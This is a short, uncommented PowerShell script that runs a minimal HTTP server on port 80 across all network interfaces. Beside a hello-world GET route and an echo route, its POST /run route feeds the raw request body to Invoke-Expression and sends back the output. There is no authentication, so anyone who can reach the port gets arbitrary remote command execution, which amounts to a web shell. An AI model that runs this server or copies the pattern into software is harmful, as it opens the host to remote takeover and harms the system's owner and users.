$ep=new-object System.Net.IPEndpoint([ipaddress]::any,80);$l=new-object System.Net.Sockets.TcpListener $ep;$l.start()
while(1){[int]$status=200;$wH=@{"X-Powered-By"="htt_ps";"Content-Type"="text/plain";};$b=New-Object System.Collections.ArrayList
$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$bu=New-Object byte[] 256;$tB=New-Object System.Collections.ArrayList
if(!$s.DataAvailable){Write-Host 'nodata';$s.Dispose();$c.Dispose();continue}
while($s.DataAvailable){$s.Read($bu,0,$bu.Length);$tB.AddRange($bu);$bu.Clear()}
$rS=([System.Text.Encoding]::UTF8).GetString($tB.ToArray())-replace"`0",""
$r=Select-String -InputObject $rS "([A-Z]{3,}) (\S+) HTTP\/(\d\.\d)\r\n([a-zA-Z-_\r\n: ?\/\d.*,]+)\r\n\r\n(.+)?"
$r=$r.Matches[0].Groups#0all1method2path3version4headers5body
$rH=@{};$r[4]-split "`r`n"|foreach{$t=$_ -split ": ";$rH[$t[0]]=$t[1];}
if($r.Count -ge 5){write-host -NoNewline "$($r[1]) $($r[2])"
try{switch($r[1]){
    'POST'{
        if($r[2]-match '\/run'){
            $b.AddRange(([System.Text.Encoding]::UTF8).GetBytes((Invoke-Expression $r[5])))
        }
        elseif($r[2]-match '\/echo'){
            $wH['Content-Type']=$rH['Content-Type']
            $b.AddRange($r[5])
        }
        else{$status=405;$b.AddRange(([System.Text.Encoding]::UTF8).GetBytes("Cannot POST $($r[2])"))}
    }
    'GET'{
        $b.AddRange(([System.Text.Encoding]::UTF8).GetBytes("htt_ps hello world!"))
    }
    Default{$status=405;$b.AddRange(([System.Text.Encoding]::UTF8).GetBytes("$($r[1]) not allowed"))}
}}
catch{$status=500;$b.AddRange(([System.Text.Encoding]::UTF8).GetBytes("error occured"))}}
else{$status=400;$b.AddRange(([System.Text.Encoding]::UTF8).GetBytes("parse error"))}
write-host " :$status"
$w="HTTP/1.1 $status IDK`n";$wH["Content-Length"]=$b.Count.ToString()
foreach($K in $wH.Keys){$w+=$K+': '+$wH[$K]+"`n"};$w+="`n"
$b.InsertRange(0,([System.Text.Encoding]::UTF8).GetBytes($w));$rB=$b.ToArray()
$s.Write($rB,0,$rB.Length);$s.Close();$c.Close()}
